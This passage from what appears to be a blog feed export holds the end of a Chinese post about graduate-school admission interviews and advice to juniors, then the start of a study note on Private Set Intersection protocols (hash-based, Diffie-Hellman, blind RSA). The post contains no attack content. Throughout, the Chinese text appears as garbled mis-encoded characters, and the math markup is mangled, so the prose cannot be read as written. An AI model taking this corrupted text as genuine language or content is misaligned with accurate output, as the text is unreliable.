ï¼Œæœ€åè¿˜æ˜¯å†³å®šä¸æ‰“æ‰°è€å¸ˆäº†ã€‚ä¸­ç§‘å¤§è¿™è¾¹ä¼˜è¥ç‡å¾ˆé«˜ï¼Œç„¶åè”ç³»å¥½è€å¸ˆè¾¾æˆåŒé€‰æ‰ä¼šæœ€ç»ˆè¢«å½•å–ã€‚å¯ä»¥æŠ¥åå‰æå‰è”ç³»ä¸‹è€å¸ˆè¯•è¯•ï¼Œä¼˜è¥åæ²¡è”ç³»ä¸Šä¸è¦æ€¥ï¼Œè¦ç›¸ä¿¡é¸½å­çš„åŠ›é‡ï¼Œæœ€ç»ˆæ€»ä¼šè”ç³»ä¸Šçš„ã€‚</p><p>ä¸­ç§‘å¤§é¢è¯•ä½“éªŒç¡®å®å¥½ï¼Œå‘äº†çºªå¿µå“ï¼Œé¢è¯•æ—¶è¿˜æœ‰è´Ÿè´£äººçš„å¿—æ„¿è€…æé†’ï¼Œè¿˜åˆ†ä¸Šä¸‹åˆä¸¤åœºé¢è¯•æ±‚å¹³å‡åˆ†ä»¥è¿½æ±‚å…¬å¹³æ€§ã€‚ä¸­ç§‘å¤§ä¼šæœ‰æŠ½é¢˜ï¼Œæˆ‘ä¸€èˆ¬å°±æœ‰ç¬¬ä¸€é¢˜å°±æŠ½ç¬¬ä¸€é¢˜ï¼Œç»“æœç¬¬ä¸€é¢˜é—®é€šä¿¡åŸç†ï¼Œç„¶åæ¢ç¬¬äºŒé¢˜ä¹Ÿæ˜¯é€šä¿¡ï¼Œå½“æ—¶æˆ‘å°±æœ‰ä¸€ç‚¹æ…Œï¼ˆè‡ªå·±é€šä¿¡è¿˜æœ‰ä¿¡å·è¿™äº›è¯¾å­¦çš„ä¸å’‹åœ°ï¼‰ï¼Œç„¶åä¸€ä¸‹æ¢åˆ°åä¸€é¢˜é—®åŒºå—é“¾ä¼šä½¿ç”¨åˆ°å“ªäº›å¯†ç ç®—æ³•ã€‚ä¸­ç§‘å¤§è‹±æ–‡é¢è¯•æ˜¯æŠ½é¢˜ï¼Œé—®å¸¸è§é—®é¢˜ï¼Œè®©æˆ‘è‹±æ–‡å†è‡ªæˆ‘ä»‹ç»ä¸€æ¬¡ï¼Œç„¶åä»‹ç»å®¶ä¹¡ã€‚ä¸‹åˆçš„é—®é¢˜å¿˜äº†ï¼Œå½“å¤©ç”Ÿæ—¥ï¼Œä¸‹åˆç©å»äº†ï¼Œåæ­£è¾ƒç®€å•è½»æ¾ã€‚</p><h2 id="æ¸…æ·±å¤§æ•°æ®">æ¸…æ·±å¤§æ•°æ®</h2><p>æ¸…åŒ—æŠ¥åéƒ½æŒºéº»çƒ¦ï¼Œä¸ç„¶ä¼°è®¡æŠ¥åäººæ•°èƒ½ç¿»å‡ ç•ªï¼Œè¿˜å¥½å­¦å§å‘Šè¯‰æˆ‘æ¸…æ·±å¤§æ•°æ®é¢„æ¨å…å¬è¯´æ²¡æœ‰æœºè¯•ï¼Œä¹Ÿä¸ç”¨åšé¡¹ç›®ï¼Œæœ€åå°±æŠ¥åäº†ã€‚</p><p>æˆ‘æ²¡å’‹å‡†å¤‡ï¼Œæˆ‘è¿™æ‡’ç‹—æ„Ÿè§‰æ²¡æœ‰æŠŠæ¡çš„äº‹æƒ…å°±ä¸æƒ³å»åŠªåŠ›ï¼ˆè¿™æ˜¯æˆ‘ä¹‹åè”ç³»è€å¸ˆå¾ˆåƒåŠ›çš„æ ¹æœ¬åŸå› ï¼‰ï¼Œæ²¡æƒ³åˆ°èƒ½è¿‡ã€‚è‹±æ–‡é¢è¯•æ˜¯ç¿»è¯‘ä¸€æ®µæœ‰å…³å¼ºåŒ–å­¦ä¹ çš„æ–‡ç« ï¼Œä»–æ”¾äº†ä¸¤æ®µï¼Œä½†è¯´çš„ç¡®å®æ˜¯â€œone paragraph&quot;ï¼Œå¤§å®¶ä¸€å®šè¦å¬æ¸…æ¥šå‘€ï¼Œå› ä¸ºä¹‹å‰å­¦é•¿ä¹Ÿè¢«é—®è¿‡è¿™ä¸ªï¼Œæˆ‘æœ¬æ¥æƒ³å»å­¦RLä½†æ˜¯æ‡’ç‹—â€¦â€¦ä¸è¿‡æˆ‘å½“æ—¶è¯»å’Œç¿»è¯‘çš„è¿˜ç®—okå§ã€‚å»å¹´å­¦é•¿è‹±æ–‡é¢è¯•å°±ç¿»è¯‘ï¼Œä½†æ˜¯ç”±äºæˆ‘è¯»å’Œç¿»è¯‘å¤ªå¿«äº†ï¼ˆå¤§å®¶ç¿»è¯‘æ—¶æ…¢ç‚¹ç¿»è¯‘ï¼Œç¿»å¥½åˆ«æ€¥ï¼‰ï¼Œç„¶åå°±é—®äº†æˆ‘ä¸‰ä¸ªé—®é¢˜ï¼š1ã€è°ˆè°ˆå¯¹å¤§æ•°æ®çš„ç†è§£ï¼›2ã€è°ˆè°ˆä½ çš„èŒä¸šè§„åˆ’ï¼›3ã€ä½ åœ¨é«˜ç§‘æŠ€é¢†åŸŸæœ€å´‡æ‹œè°ï¼Œå¹¶ç»™å‡ºåŸå› ã€‚ç¬¬1ä¸ªé—®é¢˜ï¼Œç”±äºæˆ‘æ²¡å¥½å¥½å‡†å¤‡ï¼Œåªçœ‹è¿‡å¤§æ•°æ®çš„ä¸­æ–‡ç§‘æ™®ï¼Œæ²¡çœ‹è¿‡è‹±æ–‡çš„å‘€ï¼Œç£•ç£•ç»Šç»ŠæŒ¤å‡ºæ¥å‡ å¥ï¼›ç¬¬2ä¸ªé—®é¢˜ï¼Œè‡ªå·±â€careerâ€œè¿™ä¸ªå•è¯æ²¡ååº”è¿‡æ¥ï¼ŒæŒºå°´å°¬çš„ï¼›ç¬¬3ä¸ªé—®é¢˜ï¼Œå½“æ—¶å¥å­é•¿é—®çš„å¾ˆå¿«ã€ç½‘ç»œä¹Ÿä¸€èˆ¬ï¼Œæˆ‘ç¡¬æ˜¯ä¸¤ééƒ½æ²¡å¬æ‡‚ï¼Œå¥½åœ¨æœ€åæ‡‚äº†ï¼Œç„¶åè¯´äº†æˆ‘çš„å¶åƒå§šæœŸæ™ºå…ˆç”Ÿï¼Œå½“æ—¶æ…Œä¹±äº†ï¼Œä¸ç„¶åº”è¯¥èƒ½ç­”æ›´å¥½äº›ã€‚æ€»ä¹‹ï¼Œè‹±æ–‡é¢è¯•æ¯”è¾ƒç³Ÿç³•ã€‚</p><p>ä¸­æ–‡é¢è¯•ä¸­è€å¸ˆè„¸è‰²éƒ½å¾ˆä¸¥è‚ƒã€å“äººï¼Œé‚£æˆ‘å°±çœ‹æ‘„åƒå¤´å§ã€‚ä¹‹å‰å­¦é•¿æ²¡è¢«æŠ½æ•°å­¦é¢˜ï¼Œä½†æˆ‘è¢«æŠ½åˆ°äº†ä¸€é“æ¦‚ç‡è®ºé¢˜ï¼Œ2åˆ†é’Ÿè§£å†³ä¸€é“â€œæŠ½ç­¾ä¸æ¬¡åºæ— å…³â€çš„ç®€å•é¢˜ï¼ŒçŸ¥é“ç»“è®ºåç®—çš„èƒ¸æœ‰æˆç«¹å§ã€‚ç„¶åé—®äº†æˆ‘é¡¹ç›®ä¸­çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯å…³äºAIéƒ¨åˆ†çš„é—®é¢˜ï¼Œæ¯”å¦‚æ¨¡å‹å¯è§£é‡Šæ€§æ˜¯æ€ä¹ˆåšçš„ã€åˆ†å¸ƒå¼æœºå™¨å­¦ä¹ æœ‰å“ªäº›æŒ‡æ ‡ã€‚è¿™äº›éƒ½æ˜¯æˆ‘åšçš„ï¼Œä¹Ÿèƒ½çŒœåˆ°ä¼šé—®ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å½“æ—¶æœ‰ç‚¹ç´§å¼ ï¼ŒåŠ ä¸Šå¤ªä¹…æ²¡é¢è¯•äº†ï¼Œå›ç­”çš„ä¸å¥½ä¹Ÿä¸å·®å§ã€‚</p><blockquote><p>æœ€åèƒ½é€šè¿‡è€ƒæ ¸æŒºæ„å¤–çš„ï¼Œä¸è¿‡ä¸€è·¯è¿‡æ¥éƒ½æ„Ÿè§‰è‡ªå·±æŠŠå…¶ä»–å­¦æ ¡å­¦ç”Ÿæƒ³çš„å¤ªå‰å®³äº†ï¼Œå¯¼è‡´è‡ªå·±ä¸æ•¢å°è¯•æ›´é«˜çš„å¹³å°ã€‚è¥¿ç”µç½‘å®‰å…¨å›½æ¥è¯´æ˜¯å¾ˆå¼ºçš„ï¼ŒåŸ¹å…»å‡ºçš„å­¦ç”Ÿä¹Ÿå¾ˆä¸é”™ï¼Œå¤§å®¶ä¸€å®šè¦æœ‰è¿™ä¸ªè‡ªä¿¡ï¼</p></blockquote><h1 id="å»ºè®®">å»ºè®®</h1><ul><li><p><strong>æå‡å‡åˆ†å’Œæ’å</strong>ï¼Œrk1æˆ–2å‡ ä¹å°±æ˜¯æ¸…åŒ—æ•²é—¨ç –ã€‚å½“ç„¶ï¼Œè¿™åŠå¹´éƒ½ä¸‹æ¥ï¼Œå‘¨å›´çš„åŒå­¦ä»¬å‡ ä¹éƒ½èƒ½æ‹¿åˆ°å¿ƒä»ªofferã€‚</p></li><li><p>ä¸è¦å¦„è‡ªè²è–„ï¼Œåœ¨æˆ‘é‡åˆ°çš„æ‰€æœ‰é¢è¯•ä¸­ï¼ŒåŒ…æ‹¬æ¸…åçš„è€å¸ˆï¼Œéƒ½æ˜¯æŒºå–œæ¬¢è¥¿ç”µçš„å­¦ç”Ÿï¼Œå¤§å®¶ä¸€å®šè¦<strong>è‡ªä¿¡ï¼Œä¸Šç ”ç©¶ç”Ÿåè¦å¥½å¥½è¡¨ç°</strong>ã€‚ç›¸ä¿¡æ˜å¹´æ­¤æ—¶ä¸€å®šä¼šæœ‰æ¯”æˆ‘ä»¬å¼ºçš„å¾ˆå¤šçš„åŒå­¦ï¼Œæ‰€ä»¥å¤§å®¶ä¸€å®šè¦å¥½å¥½åŠªåŠ›ã€‚</p></li><li><p><strong>å¤šçœ‹bç«™ç»éªŒåˆ†äº«å’Œç»éªŒè´´</strong>ï¼Œæ¯”å¦‚ç”·ç”Ÿä¹°ä»¶poloè¡«è¿™ç§æœ‰é¢†å£çš„è¡£æœï¼Œæ‰¾ä¸ªå®‰é™æ•´æ´çš„é¢è¯•åœºæ‰€è¿˜æŒºé‡è¦çš„ã€‚å½“ç„¶å¤§å®¶ä¹‹åä¹Ÿå¯ä»¥è®°å½•ä¸€ä¸‹è‡ªå·±çš„ç»éªŒè´´ã€‚</p></li><li><p>é¢è¯•æ›´å¤šçš„è¿˜æ˜¯çœ‹å®åŠ›ï¼Œ<strong>ä¸è¦åªç®¡ç€ä¸“ä¸šè¯¾åˆ·é«˜åˆ†ï¼Œé€‰ä¿®è¯¾ä¹ŸæŒ‰å…´è¶£å¥½å¥½å­¦å§</strong>ã€‚ä¸“ä¸šé—®é¢˜å¾ˆéš¾éƒ½å‡†å¤‡åˆ°ï¼ˆå¯èƒ½å„ä¸ªå­¦æ ¡å¾ˆä¸ä¸€æ ·ï¼‰ï¼Œæ›´å¤šçš„æ˜¯å¯»æ±‚å¿ƒç†ä¸Šå®‰æ…°ï¼Œä¸è¿‡è¦æ˜¯çœŸä¸å¤ä¹ è¢«æŠ½åˆ°è¯¾å†…çŸ¥è¯†æ²¡å›åˆ°ä¸Šæ¥è¿˜æ˜¯éå¸¸å°´å°¬çš„ã€‚<strong>é¡¹ç›®æ›´è¦å¤šå¤šæŠ•å…¥æ—¶é—´</strong>ï¼Œåšå•¥é¡¹ç›®éƒ½è®¤çœŸåšï¼Œä¸è¦å¤ªåŠŸåˆ©ï¼Œäº«å—è¿‡ç¨‹æå‡è‡ªæˆ‘å³å¯ï¼Œè¿™æ ·ä»¥åå’Œå¤§ä½¬åˆä½œçš„æœºä¼šæ‰ä¼šè¶Šæ¥è¶Šå¤šã€‚</p></li><li><p>rkå¾ˆé å‰çš„åŒå­¦æ²¡å¿…è¦æŠ¥å¤ªå¤šå­¦æ ¡ï¼Œæ‰¾ä¸ªä¿åº•ä¸“å¿ƒå†²æ¸…åŒ—åäº”å§ï¼›rkè¾ƒä½çš„åŒå­¦å¯ä»¥è¯•è¯•æµ·æŠ•ç­–ç•¥ï¼Œå¤šä¸»åŠ¨è”ç³»è€å¸ˆã€‚è™½ç„¶è‚¯å®šä¼šæœ‰æ¯”è¾ƒç„¦è™‘çš„åŒå­¦æ‰‹æ¡å¾ˆå¤šofferï¼Œä½†å’±åšå¥½è‡ªå·±ä¸æµ·å°±è¡Œï¼Œå…¨ç¨‹æ§åˆ¶è‡ªå·±æ‰‹é‡Œofferä¸è¦è¶…è¿‡2ä¸ªæˆ–3ä¸ªå§ã€‚</p></li><li><p>æœ‰é—®é¢˜å¤šæ‰¾åæ¬¡ç›¸è¿‘çš„å­¦é•¿å­¦å§è¯·æ•™ï¼Œå¤§éƒ¨åˆ†å­¦é•¿å­¦å§æœ‰ç©ºæ—¶éƒ½ä¼šçƒ­å¿ƒå¸®åŠ©ï¼›å…¶æ¬¡ï¼Œå’Œä»»è¯¾è€å¸ˆå’Œæ¯”èµ›æŒ‡å¯¼è€å¸ˆé€‚å½“äº¤æµï¼Œå¾ˆå¤šè€å¸ˆå¾ˆçƒ­å¿ƒçš„ï¼Œä»ä»–ä»¬çš„è¨€è¯­å¸¸å¸¸ä¼šé€éœ²å‡ºä»–ä»¬å¯¹å…¶ä»–è€å¸ˆçš„äº†è§£ã€‚å½“ç„¶ï¼Œæœ‰äº›è€å¸ˆä¼šçƒ­å¿ƒåˆ°ç»™ä½ æ¨èè€å¸ˆï¼Œæˆ‘è§‰å¾—å’±ä»¬éƒ½æ˜¯æˆå¹´äººäº†ï¼Œè‡ªå·±ä¸»åŠ¨å»å’Œå…¶ä»–è€å¸ˆèŠä¹ŸæŒºå¥½ï¼Œè‡³å°‘ä¸‡ä¸€é¸½è€å¸ˆæ—¶ä¸ä¼šå¾—ç½ªä¸­é—´äººã€‚</p></li></ul><blockquote><p>æœ‰é—®é¢˜æ—¶æ¬¢è¿åœ¨è¯„è®ºä¸­æé—®ï¼Œå¦‚æœæœ‰éå¸¸éšç§çš„é—®é¢˜å°±é€šè¿‡é‚®ä»¶äº¤æµï¼š3174626517 AT-&gt; <a href="http://qq.com">qq.com</a> ï¼ˆç›´æ¥è¯´æ˜æ¥æ„å³å¯ï¼‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç»éªŒè´´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>éšç§æ±‚äº¤æŠ€æœ¯çš„åŸç†ã€å‘å±•åŠåº”ç”¨</title>
      <link href="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1PT411J7rm?spm_id_from=333.337.search-card.all.click&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">ã€éšç§è®¡ç®—æŠ€æœ¯ã€‘éšç§æ±‚äº¤PSIæŠ€æœ¯çš„åŸç†åŠå‘å±•</a></p><p>ä»‹ç»äº†éšç§æ±‚äº¤çš„åŸºæœ¬å®šä¹‰ä»¥åŠå¸¸è§åº”ç”¨ã€‚ä»‹ç»äº†å¸¸ç”¨çš„PSIåè®®ä»¥åŠå®ƒä»¬çš„åŸç†å¹¶è¿›è¡Œäº†æ•ˆç‡åˆ†æã€‚åŸºäºå“ˆå¸Œçš„PSIæ•ˆç‡ä¸Šè¾¾åˆ°äº†ä½é€šä¿¡é‡ã€ä½è®¡ç®—é‡ï¼Œä½†åœ¨å®‰å…¨æ–¹é¢å¯èƒ½é­åˆ°æ”»å‡»ï¼Œæ•…ç°åœ¨å·²ç»ä¸é‡‡ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œéšç§æ±‚äº¤ï¼›åŸºäºå…¬é’¥å¯†ç å­¦çš„PSIå®ç°äº†ä¸­è®¡ç®—é‡ã€ä½é€šä¿¡é‡ï¼ŒåŒæ—¶ä¹Ÿä¿è¯äº†æ•´ä¸ªåè®®çš„å®‰å…¨ã€‚</p><span id="more"></span><h1 id="ç®€ä»‹">ç®€ä»‹</h1><p><code>PSI(Private Set Intersection)</code>æ˜¯ä¸€ç§<u>ç‰¹æ®Šçš„å®‰å…¨è®¡ç®—åè®®</u></p><ul><li>å‚ä¸æ–¹æ•°é‡&gt;= 2</li><li>åŠŸèƒ½ï¼šè®¡ç®—å‚ä¸æ–¹æ•°æ®çš„äº¤é›†</li><li>å®‰å…¨ï¼šä¸æ³„éœ²äº¤é›†å¤–çš„å…ƒç´ ï¼ˆéœ€è¦Provable Securityï¼‰</li></ul><p>å·²æœ‰å·¥ä½œçš„ä¸¤ä¸ªä¸»è¦æ€è·¯ï¼š</p><ul><li>é€šç”¨å®‰å…¨è®¡ç®—ï¼ˆMPC, HE, â€¦â€¦ï¼‰ï¼šå¤©ç„¶æ”¯æŒåç»­å®‰å…¨è®¡ç®—</li><li>è½»é‡çº§å¯†ç åŸè¯­ï¼ˆOT, VOLE, â€¦â€¦ï¼‰ï¼šæ•ˆç‡é«˜</li></ul><h2 id="ä¸¤æ–¹åŠè¯šå®PSI">ä¸¤æ–¹åŠè¯šå®PSI</h2><p>æŒ‘æˆ˜ä¸è¦æ±‚ï¼š</p><ol><li><p><strong>éšç§éäº¤é›†å…ƒç´ ï¼ˆhiding)</strong></p><ul><li>å¯†ç å­¦å®‰å…¨çš„&quot;éšè—&quot;</li><li>å½“ä¸¤ä¸ªå…ƒç´ ä¸ç­‰æ—¶ï¼Œå¿…é¡»å¯¹æ¯”è¾ƒç»“æœæ·»åŠ <code>å™ªå£°ï¼ˆnoiseï¼‰</code>ä»¥é˜²æ­¢ä¸åŒ¹é…çš„å…ƒç´ è¢«ç©·ä¸¾è®¡ç®—</li></ul></li><li><p><strong>è®¡ç®—äº¤é›†å…ƒç´ ï¼ˆcomparingï¼‰</strong></p><ul><li>å½“ä¸¤å…ƒç´ ç›¸ç­‰æ—¶ï¼Œç›¸ç­‰çš„ç»“æœåº”å½“**ä»¥æŸç§æ–¹å¼ï¼ˆæ˜æ–‡/æ”¯æŒåç»­å®‰å…¨è®¡ç®—ï¼‰**çš„æ–¹å¼å…¬å¸ƒ</li></ul></li><li><p><strong>é«˜æ•ˆç‡ï¼ˆefficiencyï¼‰</strong></p><ul><li>PSIåè®®åº”å½“åœ¨é¢å¯¹å¤§è§„æ¨¡åº”ç”¨æ—¶é«˜æ•ˆå¯ç”¨</li></ul></li></ol><h1 id="å¸¸ç”¨çš„PSIåè®®åŠåŸç†">å¸¸ç”¨çš„PSIåè®®åŠåŸç†</h1><h2 id="Hash-based-PSIï¼ˆinsecureï¼‰">Hash-based PSIï¼ˆinsecureï¼‰</h2><p>å¯†ç å­¦å®‰å…¨çš„å“ˆå¸Œå‡½æ•°çš„å®‰å…¨æ€§è´¨åŒ…æ‹¬ï¼š</p><ul><li><strong>å•å‘æ€§ï¼ˆæŠ—åŸåƒæ”»å‡»ï¼‰</strong>ï¼šå¯¹ä»»æ„ç»™å®šçš„Hashç  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span>ï¼Œæ‰¾åˆ°æ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">H(x)=h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li><li><strong>æŠ—ç¬¬äºŒåŸåƒæ”»å‡»ï¼ˆæŠ—å¼±ç¢°æ’æ€§ï¼‰</strong>ï¼šå¯¹ä»»ä½•ç»™å®šçš„åˆ†å¿«<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼Œæ‰¾åˆ°æ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo mathvariant="normal">â‰ </mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y\ne x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x)=H(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li><li><strong>æŠ—ç¢°æ’æ”»å‡»ï¼ˆæŠ—å¼ºç¢°æ’æ€§</strong>ï¼‰ï¼šæ‰¾åˆ°ä»»ä½•æ»¡è¶³<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x)=H(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span> çš„å¶å¯¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li></ul><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174040545.png" alt></p><hr><p>æ•ˆç‡ï¼šä½è®¡ç®—é‡ã€ä½é€šä¿¡é‡</p><p>å®‰å…¨ï¼š<strong>å¯èƒ½é­åˆ°æ”»å‡»</strong></p><ol><li>è¾“å…¥æ•°æ®å€¼å°æ—¶é­åˆ°ç©·ä¸¾æ”»å‡»å’Œå­—å…¸æ”»å‡»</li><li>ä¸æ»¡è¶³å‰å‘å®‰å…¨æ€§</li></ol><h2 id="PKC-based-PSI">PKC-based PSI</h2><h3 id="PSI-based-on-DH">PSI based on DH</h3><p><strong>åŸºæœ¬æ€æƒ³ï¼šå…·æœ‰<code>äº¤æ¢ï¼ˆcommutativeï¼‰</code>æ€§è´¨çš„&quot;åŒé‡åŠ å¯†&quot;</strong>ã€‚ï¼ˆäº¤æ¢æ€§è´¨æ˜¯è¿›è¡Œæ¯”è¾ƒçš„åŸºç¡€ï¼‰</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174308905.png" alt></p><hr><p>æ•ˆç‡ï¼šä¸­è®¡ç®—é‡ã€ä½é€šä¿¡é‡ï¼ˆä»ä¸ºPSIçš„ä¸»æµå®ç°æ–¹å¼ï¼‰</p><p>å®‰å…¨ï¼šPKC-basedå®‰å…¨ï¼ˆåŸºäºç¦»æ•£å¯¹æ•°é—®é¢˜ï¼ˆDiscrete Logarithm Problem, DLPï¼‰ï¼‰</p><h3 id="PSI-based-on-Blind-RSA">PSI based on Blind RSA</h3><p>é€šè¿‡æ¯”è¾ƒ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">H(x_i)^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span 